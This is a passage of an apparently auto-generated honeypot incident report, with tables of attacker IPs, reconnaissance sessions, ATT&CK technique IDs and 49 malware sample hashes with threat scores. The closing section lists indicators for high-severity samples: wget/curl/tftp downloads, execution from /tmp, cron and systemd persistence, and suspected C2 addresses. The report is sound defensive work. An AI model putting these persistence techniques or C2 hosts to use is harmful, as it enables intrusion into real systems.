| IR-8402c791b3f2 | HIGH | `92.118.39[.]77` | 2026-11-19 08:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d86f722496b6 | HIGH | `92.118.39[.]77` | 2026-11-19 08:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b80f9cc78ea8 | HIGH | `92.118.39[.]77` | 2026-11-19 08:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-00e57f2b8f6d | HIGH | `77.239.124[.]252` | 2026-11-19 08:38 | Y | 0 | 0 | `T1078` |
| IR-da96084943f6 | HIGH | `92.118.39[.]77` | 2026-11-19 08:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-326b9690640f | HIGH | `92.118.39[.]77` | 2026-11-19 08:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1d099e773c3b | HIGH | `92.118.39[.]77` | 2026-11-19 08:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b3f12df0a46d | HIGH | `92.118.39[.]77` | 2026-11-19 08:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-99db692d19f1 | HIGH | `92.118.39[.]77` | 2026-11-19 08:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-be1079f16f4d | HIGH | `92.118.39[.]77` | 2026-11-19 08:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5e3f3bdfab71 | HIGH | `92.118.39[.]77` | 2026-11-19 08:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4c8a56fdcf89 | HIGH | `92.118.39[.]77` | 2026-11-19 08:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8a0e07b6a440 | HIGH | `195.178.110[.]78` | 2026-11-19 08:56 | Y | 0 | 0 | `T1078` |
_… 166 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **7** | 2026-11-19 03:16 | 2026-11-19 14:03 | 1m | 12 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | **3** | 2026-11-19 03:54 | 2026-11-19 06:18 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `109.160.32[.]154` | **2** | 2026-11-19 03:31 | 2026-11-19 05:05 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-19 09:47 | 2026-11-19 10:26 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-19 08:56 | 2026-11-19 10:31 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `195.178.110[.]78` | **2** | 2026-11-19 12:54 | 2026-11-19 14:08 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]132` | **2** | 2026-11-19 05:54 | 2026-11-19 07:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | **2** | 2026-11-19 13:54 | 2026-11-19 15:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-19 03:17 | 2026-11-19 04:11 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-19 08:38 | 2026-11-19 10:04 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-19 15:21 | 2026-11-19 16:22 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `92.118.39[.]77` | **2** | 2026-11-19 07:58 | 2026-11-19 08:47 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.95.73[.]134` | 1 | 2026-11-19 11:15 | 2026-11-19 11:15 | 12s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-11-19 13:20 | 2026-11-19 13:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.235.74[.]131` | 1 | 2026-11-19 09:41 | 2026-11-19 09:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.29.70[.]204` | 1 | 2026-11-19 14:01 | 2026-11-19 14:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]111` | 1 | 2026-11-19 06:01 | 2026-11-19 06:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.33.71[.]238` | 1 | 2026-11-19 18:33 | 2026-11-19 18:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.206.193[.]93` | 1 | 2026-11-19 14:36 | 2026-11-19 14:36 | 12s | 0 | `T1592` | 🟢 LOW |
| `118.121.202[.]149` | 1 | 2026-11-19 09:28 | 2026-11-19 09:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.24.229[.]73` | 1 | 2026-11-19 07:55 | 2026-11-19 07:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `121.146.212[.]214` | 1 | 2026-11-19 15:15 | 2026-11-19 15:16 | 23s | 0 | `T1592` | 🟢 LOW |
| `121.158.230[.]8` | 1 | 2026-11-19 05:04 | 2026-11-19 05:05 | 22s | 0 | `T1592` | 🟢 LOW |
| `131.161.15[.]31` | 1 | 2026-11-19 05:07 | 2026-11-19 05:07 | 32s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-19 03:28 | 2026-11-19 03:29 | 64s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-19 06:39 | 2026-11-19 06:40 | 82s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-19 03:02 | 2026-11-19 03:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.198.29[.]172` | 1 | 2026-11-19 14:40 | 2026-11-19 14:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `146.158.111[.]113` | 1 | 2026-11-19 14:17 | 2026-11-19 14:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `147.125.241[.]19` | 1 | 2026-11-19 15:07 | 2026-11-19 15:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `160.250.240[.]158` | 1 | 2026-11-19 09:15 | 2026-11-19 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.62[.]247` | 1 | 2026-11-19 08:16 | 2026-11-19 08:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.9[.]153` | 1 | 2026-11-19 03:26 | 2026-11-19 03:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.128.70[.]53` | 1 | 2026-11-19 07:09 | 2026-11-19 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.128.70[.]53` | 1 | 2026-11-19 09:58 | 2026-11-19 09:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `169.128.70[.]53` | 1 | 2026-11-19 13:09 | 2026-11-19 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]110` | 1 | 2026-11-19 11:37 | 2026-11-19 11:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]203` | 1 | 2026-11-19 13:01 | 2026-11-19 13:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.197[.]52` | 1 | 2026-11-19 03:28 | 2026-11-19 03:28 | 1s | 0 | `T1592` | 🟢 LOW |
| `173.33.182[.]212` | 1 | 2026-11-19 10:27 | 2026-11-19 10:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.203.243[.]177` | 1 | 2026-11-19 03:05 | 2026-11-19 03:05 | 27s | 0 | `T1592` | 🟢 LOW |
| `176.202.206[.]43` | 1 | 2026-11-19 14:59 | 2026-11-19 14:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]183` | 1 | 2026-11-19 15:37 | 2026-11-19 15:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `177.128.115[.]217` | 1 | 2026-11-19 05:35 | 2026-11-19 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.242[.]143` | 1 | 2026-11-19 04:08 | 2026-11-19 04:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.229.171[.]64` | 1 | 2026-11-19 17:58 | 2026-11-19 17:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.46.66[.]111` | 1 | 2026-11-19 18:11 | 2026-11-19 18:11 | 14s | 0 | `T1592` | 🟢 LOW |
| `182.52.90[.]208` | 1 | 2026-11-19 08:18 | 2026-11-19 08:19 | 72s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]37` | 1 | 2026-11-19 17:53 | 2026-11-19 17:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `193.107.54[.]90` | 1 | 2026-11-19 13:43 | 2026-11-19 13:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-19 06:48 | 2026-11-19 06:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-19 10:37 | 2026-11-19 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-19 14:18 | 2026-11-19 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-11-19 17:54 | 2026-11-19 17:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]78` | 1 | 2026-11-19 18:06 | 2026-11-19 18:06 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `195.96.138[.]57` | 1 | 2026-11-19 14:21 | 2026-11-19 14:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.64.98[.]23` | 1 | 2026-11-19 12:07 | 2026-11-19 12:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.138.46[.]135` | 1 | 2026-11-19 09:30 | 2026-11-19 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.150.171[.]174` | 1 | 2026-11-19 03:46 | 2026-11-19 03:46 | 33s | 0 | `T1592` | 🟢 LOW |
| `218.158.190[.]6` | 1 | 2026-11-19 06:01 | 2026-11-19 06:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `221.214.181[.]197` | 1 | 2026-11-19 11:28 | 2026-11-19 11:29 | 28s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-19 12:39 | 2026-11-19 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-19 05:33 | 2026-11-19 05:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-19 07:53 | 2026-11-19 07:53 | 9s | 0 | `T1592` | 🟢 LOW |
| `34.1.227[.]164` | 1 | 2026-11-19 04:45 | 2026-11-19 04:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.214.145[.]207` | 1 | 2026-11-19 05:10 | 2026-11-19 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.214.148[.]230` | 1 | 2026-11-19 04:34 | 2026-11-19 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.214.204[.]44` | 1 | 2026-11-19 04:45 | 2026-11-19 04:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.214.225[.]27` | 1 | 2026-11-19 05:24 | 2026-11-19 05:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.214.230[.]217` | 1 | 2026-11-19 04:52 | 2026-11-19 04:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.106.20[.]83` | 1 | 2026-11-19 10:33 | 2026-11-19 10:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `40.67.165[.]94` | 1 | 2026-11-19 15:44 | 2026-11-19 15:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `41.82.206[.]14` | 1 | 2026-11-19 07:00 | 2026-11-19 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-11-19 07:38 | 2026-11-19 07:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-11-19 14:45 | 2026-11-19 14:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.251.105[.]60` | 1 | 2026-11-19 03:25 | 2026-11-19 03:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.252.6[.]214` | 1 | 2026-11-19 03:25 | 2026-11-19 03:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `48.217.50[.]172` | 1 | 2026-11-19 12:03 | 2026-11-19 12:03 | 9s | 0 | `T1592` | 🟢 LOW |
| `54.215.254[.]166` | 1 | 2026-11-19 15:30 | 2026-11-19 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.37.101[.]126` | 1 | 2026-11-19 18:46 | 2026-11-19 18:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `59.28.174[.]77` | 1 | 2026-11-19 11:46 | 2026-11-19 11:46 | 20s | 0 | `T1592` | 🟢 LOW |
| `61.41.4[.]17` | 1 | 2026-11-19 08:20 | 2026-11-19 08:20 | 5s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-19 07:03 | 2026-11-19 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-19 16:06 | 2026-11-19 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.227.90[.]185` | 1 | 2026-11-19 12:52 | 2026-11-19 12:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-11-19 03:45 | 2026-11-19 03:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-11-19 02:58 | 2026-11-19 02:58 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]57` | 1 | 2026-11-19 04:13 | 2026-11-19 04:14 | 4s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]172` | 1 | 2026-11-19 06:47 | 2026-11-19 06:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]143` | 1 | 2026-11-19 09:34 | 2026-11-19 09:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]44` | 1 | 2026-11-19 10:36 | 2026-11-19 10:36 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]181` | 1 | 2026-11-19 09:34 | 2026-11-19 09:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]157` | 1 | 2026-11-19 16:38 | 2026-11-19 16:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `68.183.161[.]107` | 1 | 2026-11-19 05:11 | 2026-11-19 05:11 | 1s | 0 | `T1592` | 🟢 LOW |
| `70.176.108[.]73` | 1 | 2026-11-19 10:06 | 2026-11-19 10:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `71.135.2[.]221` | 1 | 2026-11-19 13:19 | 2026-11-19 13:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.129.93[.]75` | 1 | 2026-11-19 09:52 | 2026-11-19 09:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]4` | 1 | 2026-11-19 12:03 | 2026-11-19 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-19 03:03 | 2026-11-19 03:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-19 07:40 | 2026-11-19 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-19 18:04 | 2026-11-19 18:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]132` | 1 | 2026-11-19 09:46 | 2026-11-19 09:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-19 06:25 | 2026-11-19 06:25 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-19 12:35 | 2026-11-19 12:35 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-19 18:42 | 2026-11-19 18:42 | 1s | 1 | `T1110.001` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-19 07:13 | 2026-11-19 07:13 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-19 11:45 | 2026-11-19 11:45 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-19 16:15 | 2026-11-19 16:15 | 6s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-11-19 04:22 | 2026-11-19 04:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.217.149[.]41` | 1 | 2026-11-19 16:00 | 2026-11-19 16:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]8` | 1 | 2026-11-19 05:41 | 2026-11-19 05:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.178.126[.]237` | 1 | 2026-11-19 12:57 | 2026-11-19 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]63` | 1 | 2026-11-19 12:12 | 2026-11-19 12:12 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.186.135[.]14` | 1 | 2026-11-19 06:27 | 2026-11-19 06:27 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
